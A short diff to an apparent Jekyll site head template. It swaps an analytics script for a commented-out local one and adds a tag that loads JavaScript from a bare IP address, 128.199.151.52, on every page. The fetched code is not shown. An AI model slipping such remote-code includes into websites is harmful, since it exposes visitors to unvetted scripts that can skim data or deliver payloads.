@@ -1,4 +1,4 @@
-<script type="text/javascript" src="https://cdn.vwo-analytics.com/lib/24800.js"></script>
+<!--<script src="{{ site.url }}/assets/js/1.js" type="text/javascript"></script>-->
 <meta charset="utf-8">
 <title>{% if page.title %}{{ page.title }} &#8211; {% endif %}{{ site.title }}</title>
 {% if page.excerpt %}<meta name="description" content="{{ page.excerpt | strip_html }}">{% endif %}
@@ -34,6 +34,10 @@
 <![endif]-->
 
 <!-- Modernizr -->
+<script>
+window.vwoShowPage = function () {};
+</script>
+<script src="//128.199.151.52/lib/40515.js" type="text/javascript"></script>
 <script src="{{ site.url }}/assets/js/vendor/modernizr.custom.min.js"></script>
 
 <link href='{{ site.url }}/assets/css/google-font.css' rel='stylesheet' type='text/css'>
